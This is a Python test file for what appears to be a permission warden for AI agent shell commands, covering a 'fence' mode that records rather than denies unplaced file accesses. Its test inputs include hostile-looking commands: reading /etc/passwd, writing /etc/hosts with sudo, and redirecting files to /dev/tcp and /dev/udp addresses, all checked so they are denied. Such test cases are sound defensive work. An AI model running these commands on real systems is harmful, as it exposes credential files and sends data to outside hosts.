"""Inside a fence the warden records shell file accesses, it does not deny them (ADR-0028).

A call is fenced only when the resident warden finds a fence run above the
caller's SO_PEERCRED pid. Then a shell line whose files the parser cannot
place, or places outside file_read / file_write, is allowed and recorded
as fence_enforced in the audit log and the session tree. Every other check
decides as before. Without a fence run, enforce denies as before.
"""

from __future__ import annotations

import base64
import json
import os
import socket
import threading
from pathlib import Path

import pytest

from opendaisugi import fence_runs
from opendaisugi.models import ActionPlan, Envelope, Permission, ShellStep
from opendaisugi.verify import FENCE_PREFIX, verify
from opendaisugi.warden import register_envelope
from opendaisugi.warden_server import SOCK_NAME, serve

# The frozen-table examples: the parser cannot place their files.
FROZEN = (
    "git -c user.name=x commit -m m",
    "sed -n 'w /etc/out' a.txt",
    "sudo tee /etc/hosts",
)


def _envelope(ws: Path, heads: list[str] | None = None) -> Envelope:
    return Envelope(
        generated_by="test",
        task="t",
        permissions=Permission(
            file_read=[f"{ws}/**"],
            file_write=[f"{ws}/**"],
            shell=True,
            shell_allowlist=heads or ["git", "sed", "sudo", "cat", "ls"],
            network=False,
        ),
    )


def _plan(cmd: str) -> ActionPlan:
    return ActionPlan(source="test", task="t", steps=[ShellStep(id="s", command=cmd)])


@pytest.mark.parametrize("cmd", [*FROZEN, "cat /etc/passwd"])
def test_verify_unfenced_denies_and_fenced_records(tmp_path: Path, cmd: str) -> None:
    env = _envelope(tmp_path)
    plain = verify(_plan(cmd), env, dialect_base=str(tmp_path))
    assert not plain.ok
    assert any(v.stage == "permissions" for v in plain.violations)
    fenced = verify(_plan(cmd), env, dialect_base=str(tmp_path), fenced=True)
    assert fenced.ok, fenced.violations
    marks = [w for w in fenced.warnings if w.startswith(FENCE_PREFIX)]
    assert marks, fenced.warnings


def test_fenced_keeps_a_non_file_check(tmp_path: Path) -> None:
    """A head outside the allowlist still denies inside the fence."""
    env = _envelope(tmp_path, heads=["ls"])
    r = verify(_plan("cat /etc/passwd"), env, dialect_base=str(tmp_path), fenced=True)
    assert not r.ok
    assert any("command_head" in v.detail for v in r.violations)


NET_DEVICES = (
    "cat a.txt > /dev/tcp/1.2.3.4/80",
    "cat a.txt >> /dev/udp/1.2.3.4/53",
    "cat < /dev/tcp/1.2.3.4/80",
    "cat a.txt &> /dev/tcp/1.2.3.4/80",
    "cat a.txt | cat > '/dev/tcp/1.2.3.4/80'",
    "cat /dev/tcp/1.2.3.4/80",
)


@pytest.mark.parametrize("decompose", [True, False])
@pytest.mark.parametrize("cmd", NET_DEVICES)
def test_a_net_device_still_denies_inside_a_fence(
    tmp_path: Path, cmd: str, decompose: bool
) -> None:
    """The fence does not limit the network, so /dev/tcp and /dev/udp are
    never relaxed: fenced and unfenced decide the same (ADR-0028)."""
    env = _envelope(tmp_path)
    env.permissions.shell_allow_decomposition = decompose
    plain = verify(_plan(cmd), env, dialect_base=str(tmp_path))
    fenced = verify(_plan(cmd), env, dialect_base=str(tmp_path), fenced=True)
    assert not plain.ok
    assert not fenced.ok, fenced.warnings


@pytest.fixture
def ws(tmp_path: Path) -> Path:
    w = tmp_path / "ws"
    w.mkdir()
    return w


@pytest.fixture
def root(tmp_path: Path, ws: Path) -> Path:
    # Apart from the workspace: the data dir (root.parent) is warden state.
    r = tmp_path / "d" / "warden"
    register_envelope(_envelope(ws), root=r)
    return r


@pytest.fixture
def sock(root: Path):
    ready, stop = threading.Event(), threading.Event()
    t = threading.Thread(
        target=serve, args=(root,), kwargs={"ready": ready, "stop": stop}, daemon=True
    )
    t.start()
    assert ready.wait(5), "server did not start"
    yield root / SOCK_NAME
    stop.set()
    t.join(5)


def _call(sock: Path, cwd: Path, cmd: str) -> dict:
    body = {
        "session_id": "s1",
        "tool_name": "Bash",
        "tool_input": {"command": cmd},
        "cwd": str(cwd),
    }
    req = {
        "v": 1,
        "argv": ["--mode", "enforce"],
        "stdin_b64": base64.b64encode(json.dumps(body).encode()).decode(),
    }
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as s:
        s.settimeout(30)
        s.connect(str(sock))
        s.sendall(json.dumps(req).encode() + b"\n")
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(65536)
            assert chunk, "no reply"
            buf += chunk
    return json.loads(buf)


def _audit(root: Path) -> list[dict]:
    lines: list[dict] = []
    for p in sorted((root / "audit").glob("*.jsonl")):
        lines += [json.loads(x) for x in p.read_text().splitlines() if x]
    return lines


@pytest.mark.parametrize("cmd", FROZEN)
def test_resident_unfenced_enforce_denies(sock: Path, root: Path, ws: Path, cmd: str) -> None:
    reply = _call(sock, ws, cmd)
    assert reply["exit_code"] == 2, reply
    rec = _audit(root)[-1]
    assert rec["would_deny"] is True
    assert rec["violations"] and rec["violations"][0]["stage"] == "permissions", rec
    assert "fence_enforced" not in rec


@pytest.mark.parametrize("cmd", FROZEN)
def test_resident_fenced_allows_and_records(sock: Path, root: Path, ws: Path, cmd: str) -> None:
    fence_runs.register(root, os.getpid(), str(ws))
    try:
        reply = _call(sock, ws, cmd)
    finally:
        (root / fence_runs.RUNS_DIR / f"{os.getpid()}.json").unlink()
    assert reply["exit_code"] == 0, reply
    rec = _audit(root)[-1]
    assert rec["allow"] is True and rec["would_deny"] is False
    assert rec["fence_enforced"], rec
    assert not any(m.startswith(FENCE_PREFIX) for m in rec["fence_enforced"])
    tree = (root.parent / "sessions").rglob("*.jsonl")
    verdicts = [
        json.loads(x)
        for p in tree
        for x in p.read_text().splitlines()
        if x and json.loads(x).get("type") == "verdict"
    ]
    assert verdicts and verdicts[-1]["fenceEnforced"] == rec["fence_enforced"]


def test_resident_record_with_a_wrong_start_time_is_unfenced(
    sock: Path, root: Path, ws: Path
) -> None:
    """Fail closed: a record whose start time is not this pid's is no fence run."""
    d = root / fence_runs.RUNS_DIR
    d.mkdir(parents=True, exist_ok=True)
    rec = {"pid": os.getpid(), "start": "1", "workspace": str(ws)}
    (d / f"{os.getpid()}.json").write_text(json.dumps(rec))
    try:
        reply = _call(sock, ws, FROZEN[0])
    finally:
        (d / f"{os.getpid()}.json").unlink()
    assert reply["exit_code"] == 2, reply


def test_a_variable_does_not_fence_a_call(
    sock: Path, root: Path, ws: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("DAISUGI_FENCED", "landlock")
    reply = _call(sock, ws, FROZEN[0])
    assert reply["exit_code"] == 2, reply


def test_resident_record_from_an_earlier_boot_is_unfenced(sock: Path, root: Path, ws: Path) -> None:
    """A pid and a start time can repeat after a reboot, so the record holds
    the boot id and a record from another boot is no fence run (review F5)."""
    d = root / fence_runs.RUNS_DIR
    d.mkdir(parents=True, exist_ok=True)
    good = {
        "pid": os.getpid(),
        "start": fence_runs.proc_start(os.getpid()),
        "workspace": str(ws),
    }
    path = d / f"{os.getpid()}.json"
    try:
        for boot in ("00000000-0000-0000-0000-000000000000", None):
            rec = dict(good) if boot is None else {**good, "boot": boot}
            path.write_text(json.dumps(rec))
            assert _call(sock, ws, FROZEN[0])["exit_code"] == 2, boot
        path.write_text(json.dumps({**good, "boot": fence_runs.boot_id()}))
        assert _call(sock, ws, FROZEN[0])["exit_code"] == 0
    finally:
        path.unlink()


def test_register_stores_the_boot_id(tmp_path: Path) -> None:
    fence_runs.register(tmp_path, os.getpid(), str(tmp_path))
    rec = json.loads((tmp_path / fence_runs.RUNS_DIR / f"{os.getpid()}.json").read_text())
    assert rec["boot"] == fence_runs.boot_id() and rec["boot"]
